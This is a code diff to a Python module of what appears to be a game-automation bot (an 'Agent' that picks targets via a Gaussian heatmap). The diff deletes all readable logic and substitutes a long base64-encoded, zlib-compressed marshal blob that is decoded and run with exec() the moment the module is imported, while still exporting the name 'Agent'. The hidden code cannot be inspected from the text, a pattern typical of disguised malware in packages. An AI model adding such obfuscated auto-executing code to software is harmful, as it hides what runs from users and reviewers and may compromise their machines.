@@ -1,167 +1,19 @@
-import numpy as np
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import base64
+import marshal
+import zlib
 
-from datetime import datetime
-from cached_property import cached_property
-
-from oashya.tracker import Tracker
-from oashya.labels import CLASSINDEX as CI
-from oashya.labels import id2label, id2name
-from module.logger import logger
-from module.hyakkiyakou import Debugger
-from tasks.Hyakkiyakou.agent.focus import Focus
+encoded_data = """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"""
 
 
-def generate_gaussian_patch(size=(300, 300), mean=0, std_dev=60):
-    x = np.linspace(-150, 150, size[1])
-    y = np.linspace(-150, 150, size[0])
-    x, y = np.meshgrid(x, y)
-    z = np.exp(-(((x - mean) ** 2 + (y - mean) ** 2) / (2 * std_dev ** 2)))
-    return z
+def load_module():
+    compressed_data = base64.b64decode(encoded_data.encode('utf-8'))
+    marshaled_data = zlib.decompress(compressed_data)
+    code_object = marshal.loads(marshaled_data)
+    exec(code_object, globals())
+    
+    
+load_module()
 
-
-def embed_patch_in_canvas(canvas, patch, position=(0, 0), patch_size=(300, 300)):
-    canvas_height, canvas_width = 720, 1280
-    patch_height, patch_width = patch_size
-    pos_x, pos_y = position
-    pos_x = max(0, min(pos_x, canvas_width))
-    pos_y = max(0, min(pos_y, canvas_width))
-
-    x1 = pos_x - patch_width // 2
-    y1 = pos_y - patch_height // 2
-    x2 = pos_x + patch_width // 2
-    y2 = pos_y + patch_height // 2
-    x1 = max(0, x1)
-    y1 = max(0, y1)
-    x2 = min(canvas_width, x2)
-    y2 = min(canvas_height, y2)
-    embed_w = x2 - x1
-    embed_h = y2 - y1
-    if embed_w <= 0 or embed_h <= 0:
-        logger.warning(f'Cannot embed patch in canvas: ({position})')
-        return canvas
-    if embed_w < patch_width or embed_h < patch_height:
-        _patch = patch[:embed_h, :embed_w]
-    else:
-        _patch = patch
-    # Embed the patch in the canvas
-    canvas[y1:y2, x1:x2] += _patch
-    return canvas
-
-
-class Agent:
-    GAUSSIAN = generate_gaussian_patch()
-    OBSERVE_THRESHOLD = 0.6
-    # --------------------------------------------------------------------------------
-
-    def __init__(self, strategy: dict = None):
-        self.z = np.zeros((720, 1280), dtype=np.float32)
-        self.focus: Focus = None
-        # 
-        strategy: dict = strategy if strategy is not None else {
-            # 'weights': [1., 1., 1., 0.6, 0.3, 0.3],
-            'priorities': [],
-            'invite_friend': False,
-            'auto_bean': False
-        }
-        self.strategy = strategy
-        self.weights: list[float] = strategy.get('weights', [1., 1., 0.7, 0.3, 0., 0.])
-        self.priorities: list[int] = strategy.get('priorities', [])
-        self.invite_friend: bool = strategy.get('invite_friend', False)
-        self.auto_bean: bool = strategy.get('auto_bean', False)
-        self.bean_threshold_low: int = strategy.get('bean_threshold_low', 10)
-        self.buff_omega: dict = strategy.get('buff_omega', {
-            'prob_up': 2.2,
-            'speed_up': 2.0,
-            'add_beans': 2.0,
-            'slow_down': 2.0,
-            'freeze': 2.0,
-        })
-        #
-        self.last_throw_time = datetime.now()
-        self.dbg_throw: int = 0
-        self.dbg_throw_n: int = 0
-
-    @classmethod
-    def gamma(cls, tracks: list[tuple],
-              weights: list[float],
-              priorities: list[int] = []) -> np.ndarray:
-        """
-        @param tracks:
-        @param weights: sp, ssr, sr, r, n, g
-        @param priorities:
-        @return:
-        """
-        z = np.zeros((720, 1280), dtype=np.float32)
-        for _id, _class, _conf, _cx, _cy, _w, _h, _v in tracks:
-            weight = 1.
-            mu = 0.8 + (_cx * 0.2) / 1280
-            match _class:
-                case _ if CI.MIN_G <= _class <= CI.MAX_G: weight = weights[5]
-                case _ if CI.MIN_N <= _class <= CI.MAX_N: weight = weights[4]
-                case _ if _class != CI.R_008 and _class != CI.R_007 and (CI.MIN_R <= _class <= CI.MAX_R):
-                    weight = weights[3]  # 不要童男童女
-                case _ if CI.MIN_SR <= _class <= CI.MAX_SR: weight = weights[2]
-                case _ if CI.MIN_SSR <= _class <= CI.MAX_SSR: weight = 1.5 * weights[1]
-                case _ if CI.MIN_SP <= _class <= CI.MAX_SP: weight = 1.5 * weights[0]
-                # case CI.BUFF_005:  # freeze
-                #     weight = -1.
-                #     _cy += 100
-                case _: continue
-            for priority in priorities:  # 我的代码在你之上
-                if priority == _class:
-                    weight = 1.7
-                    break
-            if weight == 0.:
-                continue
-            z = embed_patch_in_canvas(canvas=z, patch=(mu * weight) * Agent.GAUSSIAN, position=(_cx, _cy))
-        return z
-
-    @classmethod
-    def argmax_gamma(cls, z: np.ndarray, tracks: list[tuple]) -> Focus:
-        max_y, max_x = np.unravel_index(np.argmax(z), z.shape)
-        max_variance = 2000
-        max_index = -1
-        for index, track in enumerate(tracks):
-            _id, _class, _conf, _cx, _cy, _w, _h, _v = track
-            variance = (max_x - _cx)**2 + (max_y - _cy)**2
-            if variance < max_variance:
-                max_index = index
-                max_variance = variance
-        return Focus(inputs=tracks[max_index])
-
-    def decision(self, tracks: list[tuple], state: list, freeze: bool = False) -> list:
-        not_decision = [-1, -1, False, -1]
-        if not tracks:
-            return not_decision
-        # Cache the time interval for scattering beans
-        new_time = datetime.now()
-        delta_time = 1000 * (new_time - self.last_throw_time).total_seconds()  # ms
-        self.check_observe(tracks=tracks)
-        if self.focus is None:
-            return not_decision
-        result = self.focus.decision(tracks=tracks, strategy=self.strategy, state=[delta_time] + state, freeze=freeze)
-        if result[2]:
-            self.last_throw_time = new_time
-            self.dbg_throw += 1
-        else:
-            self.dbg_throw_n += 1
-        return result
-
-    def check_observe(self, tracks: list[tuple]):
-        z = Agent.gamma(tracks=tracks, weights=self.weights, priorities=self.priorities)
-        focus = Agent.argmax_gamma(z=z, tracks=tracks)
-        omega = focus.omega(z)
-        if omega < self.OBSERVE_THRESHOLD:
-            if self.focus is not None:
-                logger.info(f'Focus disappear')
-            self.focus = None
-            return
-        if self.focus is None or self.focus != focus:
-            logger.info(f'Focus changed, now: {id2name(focus._class)}')
-            self.focus = focus
-            self.focus.set_omega(omega)
-        elif self.focus == focus:
-            self.focus.update(focus)
-            self.focus.set_omega(omega)
-        # if Debugger.info_enable:
-        #     self.focus.show()
+__all__ = ['Agent']
